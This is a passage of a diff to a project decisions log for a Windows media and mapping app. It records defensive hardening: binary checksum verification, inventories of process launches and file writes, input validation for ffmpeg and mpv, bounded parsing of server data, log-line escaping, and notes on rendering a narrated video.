+  confirming the formula. *(2026-10-01.)*
+- **The programs in `bin/` are vouched for before they run (`tools/aegis.py`,
+  `config/bin_manifest.json`).** mpv, yt-dlp and ffmpeg run on every play,
+  search, decode and Echo job, and parse media from the internet; none of the
+  three is code-signed, so integrity has to come from checksums. Before this,
+  nothing recorded where two of them came from. Decisions, each the owner's:
+  (1) **A mismatch refuses.** A warning on a security check becomes a routine
+  people click past, and then it is the cheapest path. The refusal is an ERROR
+  for Emanon and a slug (`binary_unverified`) each tab turns into text that
+  names the fix.
+  (2) **A refused `bin/` copy never falls back to PATH.** Otherwise breaking the
+  `bin/` copy would be a way to run whatever PATH holds.
+  (3) **A program only on PATH runs, unverified, warned once.** It is the
+  owner's own install, outside the manifest's reach; refusing it would only
+  break a clone without `bin/`, and planting on PATH already takes local
+  access.
+  (4) **Recording an update is one command.** yt-dlp must be updated whenever
+  YouTube changes, so a slow ritual would get skipped: `bin\yt-dlp.exe -U`, then
+  `python -m tools.aegis record yt-dlp`, which checks the release's published
+  `SHA2-256SUMS` and refuses on a mismatch. mpv and ffmpeg take `--expect` (the
+  publisher's checksum) and, when that checksum is of an archive, the archive.
+  (5) **Hashed once per program per process**, cached by path, size and mtime,
+  so a file changed while Felhaven runs is checked again. Measured 2026-10-01:
+  all three, 237.7 MB, hash in 1.28 s; the first panel build pays it.
+  (6) **Tests**: `test_bin_manifest` checks the manifest's shape and that the
+  code asks for exactly the programs it lists, everywhere; the real hashes
+  wherever `bin/` exists (from a worktree, the main checkout's). CI has no
+  `bin/`, so there it skips by name; anywhere else a missing `bin/` fails
+  unless `FELHAVEN_NO_BIN=1`, because a quiet skip on the machine that runs
+  Felhaven would hide exactly the mismatch this exists to catch.
+  **First recording (2026-10-01):** yt-dlp matched its release's
+  `SHA2-256SUMS`, and ffmpeg was byte-identical to the one inside gyan.dev's
+  8.1.2 essentials zip (the zip matching its published sha256). mpv was the
+  right commit (v0.41.0-744-g304426c39) but a different build from any still
+  published (built Jun 9 against FFmpeg N-124935; shinchiro's two builds of
+  that commit are Jun 10, N-124930), so where it came from could not be
+  proven. It was replaced with shinchiro's generic x86_64 build, whose archive
+  matched its published sha256; the old copy was kept aside, not deleted.
+  Known limit: a program swapped AFTER it was checked, while Felhaven runs, is
+  not caught until the next launch; that needs local write access, and anyone
+  with it can edit the code too. The versions were already public (morpheus.py,
+  CHANGELOG), so the manifest reveals only the hashes. *(2026-10-01.)*
+- **A connect that times out is both `Offline` and `Timeout`
+  (`hermes.ConnectTimeout`).** Found in the live check: on Windows a
+  connection to a CLOSED local port is refused only after ~2 s (measured
+  2.03 s), which is Aether's whole Ollama budget, so a stopped Ollama showed
+  as a timeout ("unknown", plus a WARNING) instead of "offline". requests had
+  treated a connect timeout as a connection error too, and every reader's
+  arms were written against that. So hermes raises one class that is both:
+  Aura and Pheme, which ask `Timeout` first, answer exactly as before, and
+  Aether's "Offline means offline" holds again. A deadline that runs out
+  during the connect stays `DeadlinePassed`. *(2026-10-03.)*
+- **Every process launch and shell opener is listed, with where its arguments
+  come from (`tests/test_process_launches.py`).** A program reads an argument
+  that starts with `-` as an option, and the shell's "open" RUNS an `.exe`,
+  `.bat` or `.lnk` it is handed, so each such call is a place where a value from
+  a feed, the model or a config file could become a command. Before this, the
+  list of them lived only in someone's notes and went stale. Decisions, each
+  the owner's:
+  (1) **What counts:** something outside Python acts on a name we hand it. A
+  program (`subprocess`, `os.system`/`popen`/`exec*`/`spawn*`, asyncio and pty
+  subprocesses, `CreateProcess`, `WinExec`), the shell's open verb
+  (`os.startfile`, `webbrowser`, `ShellExecute`), a shell file operation
+  (`SHFileOperation`, since Artemis's is a whole-folder delete driven by a
+  string), and Tcl's `exec`, since this is a Tk app. Every reference counts,
+  through any import alias, so `f = subprocess.run` is a site too. Plain file
+  writes and deletes are not launches.
+  (2) **Keyed by file and function, never by line,** with the tuple of
+  launchers the function uses. A line number changes with every edit above
+  it; a function rarely moves. A second call, or a launcher swapped for
+  another, changes the tuple and fails.
+  (3) **A two-word verdict, checked against the sources.** Each line names
+  where the arguments come from (constant, app path, owner, config, network,
+  llm). `trusted` is allowed only when every source is a constant or the app's
+  own path; otherwise it is `checked`, and the reason names the check. The
+  file is published, so it holds only why each site is safe.
+  (4) **A helper whose check is in its caller lists its callers,** and a new
+  caller anywhere fails. Both this guard and semgrep look inside one function
+  at a time, so a second caller that skipped the check would pass both.
+  (5) **mpv's pipe is a launcher too.** mpv's `run` and `subprocess` commands
+  start programs, `load-script` runs code, and `script-opts` names the yt-dlp
+  its hook runs. Morpheus may only write the commands it uses today, and
+  `cycle`/`set_property`/loadfile options only on `pause`, `volume` and
+  `start`.
+  **What it can't see**, written down rather than pretended: a module
+  imported by a string that isn't a constant, exec/eval of Python source, a
+  changed argument inside a call already listed, files outside
+  `metis_toolbox/` or not in Python (`Felhaven.bat`, `publish-snapshot.sh`),
+  and untracked files. The guard reads `git ls-files`, so a new file is
+  invisible to it until staged. *(2026-10-03.)*
+- **The semgrep tripwire is run by hand, never in CI
+  (`tests/semgrep/felhaven_sinks.yml`).** It traces a value from the network,
+  a config or environment read, or a model-facing argument into a launch,
+  which catches what the launch guard can't: an argument whose source changed
+  inside a launch already listed. In CI it would need its own hashed lock for
+  64 packages (an MCP server, a web server, telemetry exporters among them) and
+  a 236 MB native binary, released weekly (measured 2026-10-03); the runtime
+  lock is 22 packages. That is the surface the hashed lock was built to cut
+  away, added back for a tripwire. So it runs from a venv of its own when the
+  launch guard reports a new site and at each security review, with
+  `--metrics=off`. Its sinks are generated from the launch guard's own tables
+  and held equal by text, not by parsing YAML: no YAML parser is in the lock,
+  and a check that reads a file differently from the program that consumes it
+  can pass a file that program rejects. semgrep checks the rule itself, with
+  its own test format (`felhaven_sinks.py`). One source changed when it moved
+  in: `subprocess.run(...).stdout` never matched the code's
+  `proc = subprocess.run(...)` then `proc.stdout`, and it contains a sink, so
+  semgrep reported each such call against itself. *(2026-10-03.)*
+- **ffmpeg is only ever handed absolute paths (Echo, Orpheus).** ffmpeg reads
+  an argument starting with `-` as an option, and one with `name:` before its
+  first slash as a protocol (`concat:`, `http:`). An absolute path can be
+  neither, since ffmpeg reads a leading drive letter as a plain file. Every
+  path was already absolute by construction (measured: `mkstemp` returns one
+  even for `dir='.'` on 3.13), so `_encode_opus`, `_probe_duration` and
+  `_decode` now refuse anything else before ffmpeg starts. Not ffmpeg's
+  `file:` prefix: that changes three working command lines to defend against a
+  value that can't occur, and would hide the day the paths stop being
+  absolute (a portable, relative audio folder is plausible under §11). The
+  check makes that day loud. *(2026-10-03.)*
+- **`morpheus.play()` loads only `http://` and `https://` URLs.** mpv's
+  loadfile also opens a local path and its own `edl://`, `lavfi://` and
+  `av://` sources. Every caller passed a web URL, and the panel's add form
+  checked saved playlists, but `config/morpheus_playlists.json` is
+  hand-editable, and nothing at the program boundary checked. The check is
+  case-sensitive, so anything unexpected fails closed, and it runs before mpv
+  starts, like `describe()`'s. *(2026-10-03.)*
+- **`aegis record yt-dlp` vouches for the file before it runs.** The version,
+  which names the release whose checksums to fetch, is only known by running
+  the file, so `record` used to be the first thing to execute a fresh `-U`
+  download, before anything had vouched for it. Now the file must first appear
+  in the LATEST release's published `SHA2-256SUMS` (what `-U` installs); only
+  then does `--version` run, and that version's own sums must agree too. A
+  file that isn't the latest release is refused without running, and the fix
+  is to run `-U` again. Checked live on the real `bin/yt-dlp.exe`: the genuine
+  file recorded identically after one run; a copy with one byte added was
+  refused with none. *(2026-10-03.)*
+- **Demeter parses the grid from its bytes, a window at a time, into int16,
+  and refuses a header bigger than its box first.** The download was capped,
+  but not what the parse built from it: the whole text decoded (a second
+  copy), split into one `str` per value, then a list of ints. Measured
+  2026-10-03 on a full box's worth of OpenTopography-shaped values (3.8 M
+  cells, 68 MB): 7.5x the download (536 MB working set) in 2.31 s; values of
+  two characters at the cap reached 27.7x, ~3.0 GB. `parse_aaigrid(body,
+  max_cells)` now splits the bytes 256 KiB at a time, each window widened to
+  the next whitespace, straight into an `array("h")`: 0.13x (8.8 MB) in
+  2.12 s. Two alternatives were measured first: a regex scan was as lean but
+  40% slower (a match object per value, in the loop), and numpy's
+  `fromstring` was the slowest (5.09 s) at 1.9x, and would have brought numpy
+  into a stdlib module. The header's ncols x nrows sizes the array and comes
+  from the server, so it is checked before anything is allocated: at most
+  1.5x `grid_cells(box)`, a margin of its own (`grid_cap`'s absorbs value
+  lengths, this one the grid's extent). At that limit a hostile grid parses
+  in 2.1 s at 0.16x; past it, it is refused at once. No cellsize check: it
+  bounds nothing (resample's cost is fixed by `GRID`), and a server that lies
+  can lie at the right cellsize. A value over 64 bytes is refused wherever the
+  window edges fall (the longest real one is 18), and a bad token is quoted
+  at most 40 characters. One used to be quoted whole, so a single garbage
+  value could write ~109 MB to the log twice, roll the 1 MB log past its
+  three backups, and stay out of Emanon's 64 KB tail. A non-finite header
+  field is `bad_grid` too: `int(inf)` escaped as `OverflowError` past
+  ingest's catch and failed the whole area. Kept exactly: the NODATA rule,
+  half-to-even rounding, every slug. Changed only for garbage: non-ASCII
+  whitespace no longer separates values, and a short body that also holds a
+  bad value reports the bad value. Every ingest logs the grid's cells against
+  the limit, as it logs bytes against the cap. A tracemalloc test holds an
+  ingest under the download's own size (0.51x), a literal, never a constant
+  under test. *(2026-10-03.)*
+- **Cadmus decodes a part into one `array("d")`, and checks the .dbf's record
+  count before decoding it.** A part was a list of (x, y) tuples, ~112 bytes
+  a point against 16 in the file: on the largest real county (41019 roads,
+  37 MB .shp) `read_pair` peaked at 6.3x (324 MB working set) in 0.79 s. Now
+  1.5x (64 MB) in 0.20 s, every point identical; `cadmus.points(part)` gives
+  the pairs. The worst case was the .dbf: a dict per record, so a .dbf of
+  one-byte records reached ~96x, ~5.35 GB from one 53 MiB zip member (such a
+  zip is tiny, so the member cap is the bound that binds). `read_pair` now
+  refuses a .dbf declaring a different record count from the .shp before it
+  decodes a record. Accepted residual: both files agreeing on ~4.6 M empty
+  records (all that 53 MiB of 12-byte .shp records holds) still costs
+  ~1.75 GB. Removing it would mean storing records by column across Hecate,
+  Poseidon and Artemis, too much change for a cost that needs a compromised
+  Census server behind TLS. A tracemalloc test holds a 65,536-point part under
+  twice the file (1.06x; tuples were 8.0x). *(2026-10-03.)*
+- **Every file write, move and delete is listed, with where its path comes
+  from (`tests/test_file_writes.py`).** The launch guard's twin. A write whose
+  path an outsider can steer lands wherever this account may write, and a
+  delete driven by a string can take a whole tree. The list lived nowhere: a
+  grep found 20 files and missed six kinds of site (Calliope's `save_wav`, a
+  developer's CLI, two non-Windows fallbacks, `os.utime`, the mpv pipe's
+  `"r+b"` opens); the AST finds 38 functions, 93 references, 21 files.
+  Decisions, each the owner's:
+  (1) **What counts:** anything that creates, changes, moves or deletes a file
+  or folder: `open` and friends in a write mode (or a mode that isn't a
+  constant), the `os`, `shutil` and `tempfile` writers, archive and log
+  handlers, pathlib's methods on any expression, the Win32 file calls and
+  Tcl's `file`. Every reference through any alias, as in the launch guard.
+  Writing into a handle isn't a site; the call that opened it is. Writes made
+  by a program we start stay in the launch guard.
+  (2) **Keyed like the launch guard**, by file and function with the tuple of
+  operations, plus the folders written in and SOURCES that describe the PATH,
+  not the content. The verdict rule and the `callers` rule are the launch
+  guard's, imported from it rather than copied. Artemis's `discard_partial`
+  and `commit_area` list their caller though they are public: they check
+  nothing, and are safe only because `ingest_area` hands them `area_id()`'s
+  digits.
+  (3) **Atomicity is derived, not declared.** A function that writes content
+  with no `os.replace` in the same function must be in `_IN_PLACE` with why
+  (the log, mpv's failure snapshot, a fresh temp WAV, the pipe, Euterpe's
+  `.bak`, Artemis's copy into a `.partial`). A hand-set flag on each line
+  could drift from the code; a rule read off the code can't.
+  (4) **`.replace(` with exactly one argument is pathlib's.** `str.replace`
+  takes two or three, `datetime.replace` only keywords: true of all 21 hits.
+  **Measured with it:** Python 3.13's `rmtree` refuses a path that is itself a
+  junction and unlinks one inside without following it, so `discard_partial`
+  deletes nothing and `commit_area` raises (the ingest fails cleanly);
+  Windows 11 makes `CON .opus` an ordinary file, not the console.
+  **What it can't see**, written down rather than pretended: a path built
+  more than one call up, `Path.open(mode)` with the mode in a variable, a
+  write method on an object the AST can't type (Tk's `PhotoImage.write`), a
+  module imported by a string that isn't a constant, exec/eval, and files
+  outside `metis_toolbox/` or untracked. *(2026-10-05.)*
+- **The semgrep tripwire gets no write sinks yet.** Every path built from the
+  network, the model or the keyboard crosses a function boundary before
+  anything is written (Herodotus's `_resolve` before `_atomic_write`,
+  Artemis's `area_id` before its writers, Echo's `sanitize_filename` before
+  ffmpeg), and open-source semgrep follows taint inside one function, so
+  write sinks would find nothing today. They would cost each operation's path
+  position in the generator and a fresh install of semgrep to validate the
+  rule. The file-write guard's review is the gate; BACKLOG holds the trigger.
+  *(2026-10-05.)*
+- **A log record is one entry (`metis_logging._OneEntryFormatter`).** Emanon
+  opens the log in text mode and splits it with `str.splitlines()`, which ends
+  a line at ten characters, not only `\n`: also `\r`, `\x0b`, `\x0c`,
+  `\x1c` to `\x1e`, U+0085, U+2028 and U+2029. A message quoting outside text
+  could start a line that Emanon read as a real entry, level and logger
+  included, and two did: Demeter quoting the start of an unparseable
+  elevation reply (it replaced only `\n`), and Artemis naming a county by the
+  ID read from the Census file in its retry warning. Now the message is
+  escaped onto one line, each break written as its escape, and the lines
+  after a record's first keep their breaks but turn ` | ` into ` ¦ `, so a
+  traceback that quotes a server still reads as a traceback and can't parse
+  as an entry. Escaping CR and LF alone would have missed eight characters
+  and the traceback. A test holds the list of breaks to what `splitlines()`
+  actually splits on, asked of Python rather than written by hand, and the
+  tests read the log through Emanon's own reader. Cost: a message that held a
+  real line break (yt-dlp's or ffmpeg's stderr) now shows it as an escape,
+  all on Emanon's one row. *(2026-10-05.)*
+- **Ammit saves through a temp file and `os.replace`.** It was the one state
+  file written where it stood (`write_text`), so a crash mid-write tore it,
+  and `_load()` reads a torn file as "no timer". It now uses the argus/plutus
+  shape. Robustness, not security; the file-write guard's in-place rule found
+  it. *(2026-10-05.)*
+- **Eratosthenes refuses a coordinate that isn't on the map.** Typed
+  coordinates and Themis were range-checked; waypoints and the geocoder only
+  called `float()`, and json reads `NaN` and `Infinity`. A NaN reached
+  Artemis's `area_status()`, documented never to raise, which raised inside
+  the search's Tk callback, so the search silently did nothing. No write was
+  reachable: `area_id()` raises on a non-finite number and only ever formats
+  digits and n/s/e/w/p. Fixed where the values enter, so Artemis can assume a
+  real place. *(2026-10-05.)*
+- **Clio speaks through Calliope's seam, not through Echo.** The video plan
+  said to call Echo, the house's text-to-file tool. Echo is built for a
+  different job, Markdown to one `.opus` in `local_audio/`, and four parts of
+  that job are wrong for a video. It strips Markdown characters and list
+  numbers, so the spoken words could differ from the script. It encodes to
+  Opus, so the audio would be lossily compressed twice. Every cached line
+  would land in `local_audio/`, Orpheus's library. And it cuts text at 400
+  characters, so the batch stutter Matthew wants kept (live narration
+  synthesizes 70-character chunks one at a time) would vanish from most
+  lines. Clio calls `take_chunk`, `synthesize` and `save_wav` directly at
+  live narration's chunk caps: the seam Echo itself uses, so there is still
+  one model and one WAV writer. It refuses a line holding a character
+  Calliope strips, so the words spoken are the words written. Calliope gained
+  a per-call `speed=` for it: Clio renders at 1.3 while live narration keeps
+  its configured 1.0. *(2026-10-28.)*
+- **Clio's face is the real widget, rendered off-screen in a child process.**
+  The prototype redrew the face with Pillow. That was a second copy of its
+  geometry, missing the rim glow, the ramps and the sweep, and a new
+  dependency. Clio steps the real `PythiaFace` with `advance()` on the
+  video's clock in `panels/clio_face.py`, run as a child process so Tk and the
+  Win32 calls stay out of a tool (§0), and reads each frame back with
+  `PrintWindow`. Two measured findings shape that code. First, the read-back:
+  `PW_RENDERFULLCONTENT` reads the compositor's copy of the window, which
+  lagged. The first frames came back black and one in ten stale or
+  half-drawn, flushed or not. Flag 0 asks the window to paint itself and left
+  one stale grab in fifty, which `grab_fresh()` catches because the face
+  never draws the same frame twice running. Second, the face's own
+  `<Map>`-started loop is unbound there, or a late Map runs it inside the
+  renderer's updates. With both, two renders of an episode are
+  byte-identical. *(2026-10-28.)*
+- **Clio normalizes loudness with a compressor and a limiter, not
+  loudnorm.** The plan said two-pass loudnorm to -14 LUFS. Pythia's speech
+  has about 21 dB between its peaks and its loudness, so -14 means about +7 dB
+  on peaks already near 0 dBTP. loudnorm's linear mode won't apply gain that
+  clips, and its dynamic mode settled at -16 LUFS on these clips. Clio
+  compresses 3:1 above -24 dBFS, applies the measured gain, limits at -2 dBFS
+  at twice the sample rate, and corrects once from a fresh measurement: -14.1
+  LUFS and -1.8 dBTP on the concept reel. Every episode also ends with 0.1 s
+  more silence than the script's last hold. Raising the gain raises the last
+  word's fading tail too, and the measured hold came out about 25 ms short of
+  the 1.5 s a looping reel needs. *(2026-10-28.)*
+- **Clio's title is set in Georgia, outside `theme.FONTS`.** Felhaven's own
+  face is Consolas, and the captions use it. The serif wordmark is the
+  prototype's look, and Georgia ships with Windows as Consolas does. Widths
+  come from the font files themselves (a small TrueType reader in Clio), so
+  the safe-zone check is arithmetic for both faces, not a guess.
+  *(2026-10-28.)*
+- **Clio's long-form captions sit below the panel, not over it.** The video
+  plan had the captured panel fill the frame, with captions in a band over
+  its bottom. The first real capture showed what that band would hide:
+  Felhaven's input bar runs along the bottom of the window, and typing into
+  it is half of any Pythia walkthrough. So the panel is fitted into the area
+  above a two-line strip and nothing in the app is ever covered. On a window
+  shaped like today's (960x668), her face inset lands in the side margin,
+  not on the app. The cost is a smaller panel. Maximizing Felhaven before
+  capturing gives sharper footage, since a 960-wide window is upscaled
+  about 1.3 times. In the strip, the script's line breaks are ignored and the
+  words re-flowed, because breaks written for the vertical box's
+  27-character lines would stack past two lines there. The words stay
+  verbatim either way. *(2026-10-28.)*
+- **Clio's face window is on screen and invisible, not off screen.** The
+  face entry above placed it at (-4000, -4000), and that rendered at about
+  50 ms a frame all through phases 2 to 4. The same day, with the machine
+  idle, it slowed to about 1 s a frame: Windows had started painting the
+  off-screen window lazily, so 18 grabs in 19 came back stale. The display
+  being asleep was ruled out by holding it on. The same window on screen
+  painted every grab, and it still does at zero opacity, where nothing
+  shows and PrintWindow reads it all the same. So it now sits at the
+  screen's corner at zero opacity, and `grab_fresh()` stays as the guard.
+  The output never changed, only the speed: a stale grab was always grabbed
+  again, never written. *(2026-10-28.)*
